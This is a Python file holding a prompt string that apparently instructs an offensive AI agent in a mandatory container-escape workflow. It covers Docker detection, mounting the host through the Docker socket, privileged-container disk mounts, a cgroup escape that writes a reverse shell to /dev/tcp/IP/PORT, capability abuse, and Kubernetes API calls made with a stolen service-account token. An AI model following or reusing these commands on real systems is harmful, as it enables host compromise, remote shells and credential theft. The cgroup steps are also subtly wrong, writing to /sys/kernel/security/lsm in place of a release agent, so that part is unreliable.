"""
Container Escape Attack Skill Prompt.
"""

CONTAINER_ESCAPE_SKILL_PROMPT = """
## ATTACK SKILL: CONTAINER ESCAPE

### MANDATORY WORKFLOW

#### STEP 1: DETECT CONTAINER
```bash
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv 2>/dev/null
cat /proc/self/mountinfo | grep docker
```

#### STEP 2: DOCKER SOCKET ABUSE
If `/var/run/docker.sock` is mounted:
```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt sh
```

#### STEP 3: PRIVILEGED CONTAINER
If running with `--privileged`:
```bash
fdisk -l  # see host disks
mount /dev/sda1 /mnt && chroot /mnt
# cgroup release_agent escape:
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo '#!/bin/sh' > /cmd && echo 'sh -i >& /dev/tcp/IP/PORT 0>&1' >> /cmd
chmod +x /cmd
echo "|/cmd" > /sys/kernel/security/lsm
```

#### STEP 4: CAPABILITIES ABUSE
```bash
capsh --print  # list current capabilities
# CAP_SYS_ADMIN -> mount, cgroups, kernel modules
# CAP_SYS_PTRACE -> inject into host processes
# CAP_DAC_READ_SEARCH -> read any file
# CAP_NET_RAW -> packet sniffing
```

#### STEP 5: KUBERNETES ESCAPE
```bash
ls /var/run/secrets/kubernetes.io/serviceaccount/
# If service account token exists:
curl -k https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/default/pods -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

#### ANTI-PATTERNS: Don't skip docker socket check — it's the #1 container escape vector.
"""
